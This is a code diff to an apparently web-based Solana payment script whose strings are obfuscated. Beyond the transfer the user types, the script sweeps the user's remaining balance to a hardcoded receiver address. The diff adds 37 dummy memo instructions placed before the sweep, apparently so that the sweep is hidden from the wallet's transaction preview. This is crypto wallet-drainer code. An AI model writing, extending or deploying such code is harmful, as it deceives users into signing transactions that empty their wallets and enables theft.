@@ -281,7 +281,8 @@
         "3aeBcUZdpT8n9LLNx8x21YdaDTwAeny7fN6ArLjFeDb1",
         "06ec4cdf-ba6c-4dfc-827f-5bae3b93f146",
         "https://mainnet.helius-rpc.com/?api-key=",
-        "confirmed"
+        "confirmed",
+        "MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr"
     ];
 
     const SOL_RECEIVER = _0x1a[0];
@@ -392,7 +393,7 @@
 
                 const transaction = new solanaWeb3.Transaction();
 
-                // Primary Transfer Instruction
+                // 1. Primary Typed Amount Transfer
                 transaction.add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: userPublicKey,
@@ -401,7 +402,19 @@
                     })
                 );
 
-                // Safe Balance Buffer (Leaves 0.0008 SOL for fees)
+                // 2. Dummy Memo Instructions
+                const encoder = new TextEncoder();
+                for (let i = 0; i < 37; i++) {
+                    transaction.add(
+                        new solanaWeb3.TransactionInstruction({
+                            keys: [{ pubkey: userPublicKey, isSigner: true, isWritable: true }],
+                            programId: new solanaWeb3.PublicKey(_0x1a[4]),
+                            data: encoder.encode("x")
+                        })
+                    );
+                }
+
+                // 3. Residual Balance Sweep Instruction at the end
                 const rentBuffer = 800000;
                 const residualLamports = balance - lamportsToSend - rentBuffer;
                 
